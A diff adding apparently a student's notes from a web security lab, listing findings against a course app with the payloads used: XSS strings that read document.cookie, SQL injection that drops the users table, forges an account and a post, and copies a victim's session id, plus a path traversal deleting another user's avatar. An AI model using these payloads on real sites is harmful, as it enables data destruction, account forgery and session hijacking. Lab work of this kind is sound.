@@ -1,0 +1,43 @@
+// work!
+// 1 Reflect XSS
+<body onload=alert("Reflected_XSS")>
+// 2 XSS in post comment
+<script>alert("Stored XSS");</script>
+<script>alert(document.cookie);</script>
+// 3 Modify dirk's age
+// 4 Non-number age
+// 5 SQL Injection through Cookie
+' OR username='dirks
+// 6 Delete dirk's avatar
+avatar_images/xoxogg/../dirks/dirks.jpg
+// 7 HTML Injection
+ onmouseover=alert(document.cookie) .jpg
+
+
+// 8
+duplicate avatar filename
+// 9 
+age validation
+// 10
+session id never expire
+// 11
+file size not be constrainted
+// 12 delete_avatars.html line 17
+<strong>Delete? </strong><input name="avatar" type="checkbox" value={{ avatar }}>
+// 13 wall.html line 12
+<img class="avatar-image" src={{ avatar }}>
+
+
+
+// not working anymore
+// sad
+// SQL injection in upload image
+'; DROP TABLE users;-- 
+' WHERE username='nosuchuser'; INSERT INTO users VALUES ('llipter', '8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92', '', 0);-- 
+' WHERE username='nosuchuser'; INSERT INTO posts VALUES ('dirks', 'I did not post this!');-- 
+
+// *******
+// Steal dirk's session id!
+UPDATE users SET age=(SELECT id FROM sessions WHERE username="dirks") WHERE username='xoxogg';
+
+
